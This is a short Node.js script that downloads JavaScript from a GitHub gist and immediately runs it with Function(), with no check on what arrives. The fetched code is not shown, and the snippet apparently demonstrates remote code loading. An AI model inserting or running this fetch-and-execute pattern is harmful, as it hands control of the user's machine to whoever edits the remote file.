

const https = require('https');

const request = (url) => new Promise((r) => {
    https.get(url, (e) => { let d = ''; e.on('data', (c) => { d += c; }); e.on('end', () => r(d)) });
})

;(async () => {
    const url = 'https://gist.githubusercontent.com/LiveDuo/1309aadd70f068b503cfd78c5b5e3a28/raw/7c87b4deb9a29686e884839eaef218851e5ba5a0/example.js'
    const response = await request(url)
    Function(response)()
})()
